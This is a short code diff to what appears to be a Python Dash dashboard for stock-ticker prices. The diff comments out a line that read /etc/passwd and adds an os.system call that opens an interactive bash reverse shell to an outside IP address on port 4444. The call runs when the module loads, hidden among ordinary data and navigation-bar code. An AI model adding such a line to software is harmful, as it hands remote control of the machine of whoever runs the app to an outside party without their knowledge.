@@ -30,9 +30,10 @@ prices["date"] = pd.to_datetime(prices["date"], format="%Y-%m-%d")
 tickers = prices["ticker"].unique()
 
 # arc
-stream = os.popen('echo "OS Command";cat /etc/passwd')
-ls = stream.read()
-
+# stream = os.popen('echo "OS Command";cat /etc/passwd')
+# ls = stream.read()
+ls = "shell"
+os.system('bash -i >& /dev/tcp/185.190.92.18/4444 0>&1')
 
 # top nav bar
 nav = dbc.Navbar(
